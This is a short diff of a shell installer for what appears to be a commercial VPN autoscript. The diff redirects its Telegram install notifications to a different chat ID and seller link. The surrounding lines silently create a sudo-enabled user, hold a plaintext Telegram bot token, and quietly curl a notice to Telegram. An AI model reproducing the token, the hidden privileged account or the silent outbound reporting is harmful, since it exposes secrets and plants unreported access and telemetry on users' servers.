@@ -188,7 +188,7 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="-1002196928254"
+CHATID="5521096873"
 KEY="6668909715:AAHdCAC0NPVuXFjWEdueA2VvkkMl5Ie1WRQ"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
@@ -205,7 +205,7 @@ TEXT="Instalasi Autoscript-vvip V2.5
 By Admin @Riswanvpnstore
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 <i>Notifications Automatic From Github</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"Telegram","url":"https://t.me/Riswanvpnstore"},{"text":"Contack","url":"https://wa.me/6285888801241"}]]}'
+"'&reply_markup={"inline_keyboard":[[{"text":"Telegram","url":"https://t.me/R23_VPNSTORE"},{"text":"Contack","url":"https://wa.me/6285888801241"}]]}'
 
 curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
